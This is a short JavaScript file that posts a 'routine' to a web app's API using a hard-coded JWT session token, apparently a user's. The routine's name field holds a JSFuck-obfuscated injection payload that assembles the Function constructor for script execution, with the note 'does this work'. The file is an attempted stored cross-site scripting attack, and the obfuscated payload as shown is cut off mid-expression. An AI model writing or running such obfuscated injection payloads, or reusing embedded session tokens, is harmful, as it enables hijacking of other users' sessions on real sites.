import { postRoutine } from "../api/api.js";
import React from "react";

const token = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTA5MiwidXNlcm5hbWUiOiJoZWxwbWUiLCJpYXQiOjE2ODY3OTI5NjksImV4cCI6MTY4NzM5Nzc2OX0.KdVd-eHXOPGJuzy23pPBAR-eRSmKiO0ChiA0TkGFmR8`;

postRoutine(
  token,
  `(()=>{})[({}+[])[+!![] + +!![] + +!![] + +!![] + +!![]]+({}+[])[+!![]]+((+!![]/+[])+[])[+!![] + +!![] + +!![] + +!![]]+(![]+[])[+!![] + +!![] + +!![]]+({}+[])[+!![] + +!![] + +!![] + +!![] + +!![] + +!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![] + +!![]]+({}+[]`,
  "does this work",
  true
);
